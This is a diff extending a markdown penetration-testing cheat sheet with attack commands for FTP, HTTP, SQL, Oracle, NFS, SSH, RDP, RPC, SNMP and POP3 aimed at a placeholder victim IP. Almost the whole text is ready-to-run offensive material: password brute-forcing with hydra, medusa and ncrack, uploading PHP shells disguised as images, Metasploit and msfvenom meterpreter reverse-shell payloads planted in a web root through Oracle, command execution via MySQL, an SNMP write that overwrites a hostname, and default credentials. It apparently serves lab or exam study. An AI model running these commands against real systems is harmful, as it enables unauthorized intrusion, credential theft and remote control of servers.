@@ -1,5 +1,15 @@
 - [Amazon_S3](#Amazon_S3)
 - [DNS](#DNS)
+- [FTP](#FTP)
+- [Finger](#Finger)
+- [HTTP](#HTTP)
+- [SQL](#SQL)
+- [ORACLE](#Oracle)
+- [NFS](#NFS)
+- [SSH](#SSH)
+- [RDP](#RDP)
+- [RPC](#RPC)
+- [SNMP](#SNMP)
 --------------------------------------------------------------------------------------------------------------------------------
 # Amazon_S3
 
@@ -116,3 +126,335 @@ flag dns:  The domain you would like scanned.
 - host -l [victim_ip] ns1.[victim_ip]
 - dnsrecon -d [victim_scan] -t axfr
 ```
+--------------------------------------------------------------------------------------------------------------------------------
+# FTP:
+
+##### nmap:
+- nmap -p 21 -sV [victim_ip]
+- nmap -sV -sC [victim_ip] -p 21
+- namp --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum,ftp-default,ftp-user-enum -p [victim_ip]
+
+##### nmap tftp:
+- nmap -sU -p 69 --script tftp-enum.nse [victim_ip]
+
+##### Connect to a FTP server
+- nc -nv [victim_ip] [port]
+
+##### metasploit tftp
+- use auxiliary/scanner/tftp/tftpbrute
+
+##### Download attemps
+- ftp> GET boot.ini
+- ftp> get boot.ini
+- ftp> mget boot.ini
+- ftp> get boot.ini file_name
+
+##### Upload attemps
+- ftp> put shell.php shell.jpg
+- ftp> PUT shell.php shell.jpg
+- ftp> send 
+    (local-file) shell.php
+    (remote-file) shell.jpg
+    
+##### File Traversal
+- dir ../
+- ls ../
+
+##### Brute force
+- medusa -h [victim_ip] -u user -P passwords.txt -M ftp 
+- hydra -s [port] -C ./wordlists/ftp-default-userpass.txt -u -f [victim_ip] ftp
+
+#### TFTP
+- $ tftp [victim_ip]
+- tftp> ls
+- tftp> verbose
+- tftp> put shell.php
+
+##### Windows dir change with ~1
+- cd /Docume~1/
+- cd /Progra~1/
+
+##### FTP Bounce Scan
+nmap –top-ports 1000 -vv -Pn -b anonymous:password@[victim_ip:21] 127.0.0.1
+
+##### TFTP (udp:69)
+nmap -oN tftp.nmap -v -sU -sV -T2 –script tftp* -p 69 [victim_ip]
+--------------------------------------------------------------------------------------------------------------------------------
+# Finger
+
+### user enumeration usefull script
+
+- https://github.com/Kan1shka9/Finger-User-Enumeration
+script useage:
+```
+./finger_enum_user.sh <filename.txt>
+```
+
+#### finger comandline 
+```
+finger [username]@[ip]
+```
+--------------------------------------------------------------------------------------------------------------------------------
+# HTTP 
+
+##### Directory scanning
+- dir mode
+  - gobuster dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt
+- dns mode
+  - gobuster dns -d 10.11.1.x -w ~/wordlists/subdomains.txt
+  - gobuster dns -d google.com -w ~/wordlists/subdomains.txt -i (with ip)
+- extension usage
+  - gobuster dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt -x .php, .txt, .html
+- string usage
+  - gobuster dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt -s "200"
+- expanded usage(show full url)
+  - gobuster -e dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt
+- useragent usage
+  - gobuster dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt -a CustomAgent
+- export options
+  - gobuster dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt -o output.txt
+- proxy chain
+  -  gobuster -o gobuster.txt -e -u http://10.11.1.x/ -w ~/wordlist/shortlist.txt
+  
+##### Nikto scan
+- nikto -h [victim_ip]
+- nikto -Display V -h [victim_ip]
+- nikto -Display V -o results.html -Format htm -h [victim_ip]
+```
+0 – File Upload
+1 – Interesting File / Seen in logs
+2 – Misconfiguration / Default File
+3 – Information Disclosure
+4 – Injection (XSS/Script/HTML)
+5 – Remote File Retrieval – Inside Web Root
+6 – Denial of Service
+7 – Remote File Retrieval – Server Wide
+8 – Command Execution / Remote Shell
+9 – SQL Injection
+a – Authentication Bypass
+b – Software Identification
+c – Remote Source Inclusion
+x – Reverse Tuning Options (i.e., include all except specified)
+```
+###### Only number 9 - SQL injection
+```
+nikto -Tuning 9 -h [victim_ip]6
+```
+
+###### Everything except number 6 - DOS
+```
+nikto -Tuning x 6 -h [victim_ip]
+```
+
+#### WhatWeb
+**Another enum type tool like nikto but looks to be more advanced and prettier in output**
+- whatweb -v -a 4 http://[victim_ip]
+
+#### Cewl
+- create dict via https://tools.kali.org/password-attacks/cewl and use as dirb list scan
+--------------------------------------------------------------------------------------------------------------------------------
+# SQL
+
+#### nmap 
+- nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 [victim_ip] -p 3306
+- nmap -sV -Pn -vv -script=mysql* [victim_ip] -p 3306
+- nmap -sU --script=ms-sql-info [vicrim_ip] -p 3306
+
+#### metasploit
+- msf > use auxiliary/scanner/mssql/mssql_ping
+- msf> use auxiliary/scanner/mssql/mssql_login
+- msf> use exploit/windows/mssql/mssql_payload
+  - set PAYLOAD windows/meterpreter/reverse_tcp
+
+#### Run commands via mysql
+- mysql> select do_system('id');
+- mysql> \! sh
+
+##### Gain shell using gathered credentials
+- msf > use exploit/windows/mssql/mssql_payload
+- msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
+
+#### mssql server config file
+```
+cat freetds.conf
+
+host = $ip
+port = 1433
+tds version = 8.0
+user=sa
+
+root@kali:~/dirsearch# sqsh -S someserver -U sa -P PASS -D DB_NAME
+```
+--------------------------------------------------------------------------------------------------------------------------------
+# Oracle
+
+#### Service on port 1521 
+ 
+- Usefull tool set
+- https://www.oracle.com/pl/database/technologies/instant-client/winx64-64-downloads.html
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+#### Identify SIDs
+
+Identify SIDs via odat.py tool
+```
+apt-get install odat
+odat sidguesser -s <victim_ip>
+```
+
+Valid SID brute forcing via metasploit
+```
+msf > use auxiliary/admin/oracle/sid_brute 
+msf auxiliary(admin/oracle/sid_brute) > set rhost <victim_ip>
+msf auxiliary(admin/oracle/sid_brute) > run
+```
+
+#### Brute force credentials 
+
+Brute force credentials via metasploit
+```
+msf > use auxiliary/admin/oracle/oracle_login
+msf auxiliary(admin/oracle/oracle_login) > set sid (for example XE)
+msf auxiliary(admin/oracle/oracle_login) > set rhost <victim_ip>
+msf auxiliary(admin/oracle/oracle_login) > run
+```
+Get credentials with other way
+#TODO!
+
+#### Check options with odat
+```
+odat all -s <victim_ip> -d XE -U scott -P tiger --sysdba
+```
+**For exmaple search DBMS_XSLPROCESSOR library(this options allows us to put any files onto the machine**
+
+#### PUT aspx file in the machine
+
+Generate payload
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=<my_port> -f aspx > rs_file.aspx
+```
+
+PUT payload
+```
+odat dbmsxslprocessor -s <victim_ip> -d XE -U scott -P tiger --putFile "C://inetpub//wwwroot//" t.aspx /full/path/for/local/aspx/file --sysdba
+
+C://inetpub//wwwroot// : victim path, example for this case
+t.aspx: example shell name
+XE: example SIDs
+```
+
+#### Port 2100
+```
+credentials:
+sys:sys
+scott:tiger
+```
+
+### resources
+- https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf
+--------------------------------------------------------------------------------------------------------------------------------------
+# NFS
+- The Network File System (NFS) is a client/server application that lets a computer user view and optionally store and update files on a remote computer as though they were on the user's own computer. The NFS protocol is one of several distributed file system standards for network-attached storage (NAS).
+
+
+#### Basic Command
+- showmount [ip]
+
+- create temp local folder
+```
+mkdir /tmp/nfs
+```
+- mount
+```
+mount -t nfs [ip]:/home/vulnix /tmp/nfs -nolock
+```
+
+#### nmap 
+```
+nmap -sV --script=nfs-showmount [victim_ip]
+```
+--------------------------------------------------------------------------------------------------------------------------------------
+# SSH 
+
+#### With metasploit
+```
+use auxiliary/scanner/ssh/ssh_enumusers
+set user_file /usr/share/wordlists/metasploit/unix_users.txt or set user_file /usr/share/seclists/Usernames/Names/names.txt
+run
+```
+
+#### Bruteforce with hydra
+hydra -v -V -l root -P password-file.txt [victim_ip] ssh
+hydra -v -V -L user.txt -P /usr/share/wordlists/rockyou.txt -t 16 [victim_ip] ssh
+
+#### User name enumeration against SSH daemons affected by CVE-2016-6210.
+- https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/remote/40136.py
+
+##### searchsploit
+python /usr/share/exploitdb/exploits/linux/remote/40136.py -U /usr/share/wordlists/metasploit/unix_users.txt [victim_ip]
+
+### usefull flag: -e nsr
+
+##### ssh CVE (CVE-2008-0166)
+- https://github.com/g0tmi1k/debian-ssh
+--------------------------------------------------------------------------------------------------------------------------------------
+# RDP
+```
+rdesktop -g 1440x900 -u user_login -p user_pass [victim_ip]
+```
+
+### nmap scan with rdp nse scan
+```
+nmap -p 3389 --script rdp-ntlm-info [victim_ip]
+```
+
+### bruteforce rdp credentials
+```
+hydra -t 4  -l administrator -P /usr/share/wordlists/rockyou.txt rdp://[victim_ip]
+ncrack -vv --user administrator -P password-file.txt rdp://[victim_ip]
+```
+--------------------------------------------------------------------------------------------------------------------------------------
+# rpc
+```
+rpcinfo -p [victim_ip]
+```
+
+### nmap
+```
+nmap [vitim_ip] --script msrpc-enum
+```
+
+### metasploit
+```
+msf> use exploit/windows/dcerpc/ms03_026_dcom
+```
+--------------------------------------------------------------------------------------------------------------------------------------
+# SNMP
+
+#### SNMP Enumeration
+
+SNMP is based on UDP, a simple, stateless protocol, and therefore susceptible to IP spoofing and replay attacks. SNMP information and credentials can be easily intercepted over a local network.
+
+#### MIB Tree
+
+SNMP Managment Information Base (MIB) is a database contains info related to network management. 
+
+#### Scanning for SNMP
+- nmap -sU --open -p 161, [victim_ip] 
+
+#### Windows SNMP Enumeration Example
+- snmpwalk -c public [victim_ip] -v1
+- snmpwalk -c private [victim_ip] -v1
+- snmpwalk -c public [victim_ip] -v1 -0n | grep '1.3.6.1.2.1.1.5'
+- snmpset -v 1 -c public [victim_ip] .1.3.6.1.2.1.1.5 s HACKED
+- snmpwalk -c public [victim_ip] -v1 -0n | grep '1.3.6.1.2.1.1.5'
+
+#### SNMP-CHECK
+- snmp-check -c public 10.11.1.x
+
+#### POP3
+- telnet [victim_ip] 110
+- USER user@[victim_ip]
+- PASS admin
+- list
+- retr 1
+-------------------------------------------------------------------------------------------------------------------------------------
